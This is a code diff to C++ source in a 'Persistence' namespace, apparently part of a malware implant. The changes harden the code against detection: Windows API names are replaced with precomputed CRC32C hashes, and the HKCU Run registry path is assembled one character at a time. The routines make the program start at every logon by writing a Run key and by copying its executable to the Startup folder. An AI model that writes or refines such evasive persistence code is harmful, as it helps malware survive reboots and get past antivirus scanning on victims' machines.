@@ -13,6 +13,14 @@
 
 namespace Persistence
 {
+    // Pre-computed CRC32C hash constants (polynomial 0x82F63B78)
+    static constexpr DWORD HASH_RegOpenKeyExW    = 0x54C30E8B;
+    static constexpr DWORD HASH_RegSetValueExW   = 0x9065332B;
+    static constexpr DWORD HASH_RegCloseKey      = 0x68B40AD7;
+    static constexpr DWORD HASH_RegDeleteValueW  = 0xAF036FFD;
+    static constexpr DWORD HASH_shell32_dll      = 0x9871014D;
+    static constexpr DWORD HASH_SHGetFolderPathW = 0x05D4ED46;
+    static constexpr DWORD HASH_CopyFileW        = 0xEBD688BE;
     // ── Typedefs for dynamically resolved registry / shell / file functions ──
 
     typedef LONG(WINAPI* pfnRegOpenKeyExW)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
@@ -36,10 +44,10 @@ namespace Persistence
             ok = (hAdv != NULL);
             if (!ok) return;
 
-            RegOpenKeyExW   = (pfnRegOpenKeyExW)Api::GetProcByHashCrc(hAdv, Crc32C::ConstHash("RegOpenKeyExW"));
-            RegSetValueExW  = (pfnRegSetValueExW)Api::GetProcByHashCrc(hAdv, Crc32C::ConstHash("RegSetValueExW"));
-            RegCloseKey     = (pfnRegCloseKey)Api::GetProcByHashCrc(hAdv, Crc32C::ConstHash("RegCloseKey"));
-            RegDeleteValueW = (pfnRegDeleteValueW)Api::GetProcByHashCrc(hAdv, Crc32C::ConstHash("RegDeleteValueW"));
+            RegOpenKeyExW   = (pfnRegOpenKeyExW)Api::GetProcByHashCrc(hAdv, HASH_RegOpenKeyExW);
+            RegSetValueExW  = (pfnRegSetValueExW)Api::GetProcByHashCrc(hAdv, HASH_RegSetValueExW);
+            RegCloseKey     = (pfnRegCloseKey)Api::GetProcByHashCrc(hAdv, HASH_RegCloseKey);
+            RegDeleteValueW = (pfnRegDeleteValueW)Api::GetProcByHashCrc(hAdv, HASH_RegDeleteValueW);
 
             ok = (RegOpenKeyExW && RegSetValueExW && RegCloseKey && RegDeleteValueW);
         }
@@ -50,10 +58,12 @@ namespace Persistence
         Advapi32Funcs adv;
         if (!adv.ok) return false;
 
+        wchar_t runKeyPath[] = { L'S',L'o',L'f',L't',L'w',L'a',L'r',L'e',L'\\',L'M',L'i',L'c',L'r',L'o',L's',L'o',L'f',L't',L'\\',L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L'C',L'u',L'r',L'r',L'e',L'n',L't',L'V',L'e',L'r',L's',L'i',L'o',L'n',L'\\',L'R',L'u',L'n', 0 };
+
         HKEY hKey;
         LONG result = adv.RegOpenKeyExW(
             HKEY_CURRENT_USER,
-            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            runKeyPath,
             0,
             KEY_SET_VALUE,
             &hKey
@@ -79,10 +89,12 @@ namespace Persistence
         Advapi32Funcs adv;
         if (!adv.ok) return false;
 
+        wchar_t runKeyPath[] = { L'S',L'o',L'f',L't',L'w',L'a',L'r',L'e',L'\\',L'M',L'i',L'c',L'r',L'o',L's',L'o',L'f',L't',L'\\',L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L'C',L'u',L'r',L'r',L'e',L'n',L't',L'V',L'e',L'r',L's',L'i',L'o',L'n',L'\\',L'R',L'u',L'n', 0 };
+
         HKEY hKey;
         LONG result = adv.RegOpenKeyExW(
             HKEY_CURRENT_USER,
-            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            runKeyPath,
             0,
             KEY_SET_VALUE,
             &hKey
@@ -97,12 +109,16 @@ namespace Persistence
 
     bool CopyToStartup(const wchar_t* exePath, const wchar_t* fileName)
     {
+        // Validate fileName parameter
+        if (fileName == nullptr || wcslen(fileName) >= MAX_PATH)
+            return false;
+
         // Resolve SHGetFolderPathW via ApiResolver (shell32)
-        HMODULE hShell32 = Api::GetModuleByHashCrc(Crc32C::ConstHash("shell32.dll"));
+        HMODULE hShell32 = Api::GetModuleByHashCrc(HASH_shell32_dll);
         if (!hShell32) return false;
 
         auto pSHGetFolderPathW = (pfnSHGetFolderPathW)Api::GetProcByHashCrc(
-            hShell32, Crc32C::ConstHash("SHGetFolderPathW"));
+            hShell32, HASH_SHGetFolderPathW);
         if (!pSHGetFolderPathW) return false;
 
         // CSIDL_STARTUP = 0x0007 (avoid needing shlobj.h)
@@ -136,7 +152,7 @@ namespace Persistence
         if (!hK32) return false;
 
         auto pCopyFileW = (pfnCopyFileW)Api::GetProcByHashCrc(
-            hK32, Crc32C::ConstHash("CopyFileW"));
+            hK32, HASH_CopyFileW);
         if (!pCopyFileW) return false;
 
         return pCopyFileW(exePath, dest, FALSE) != 0;
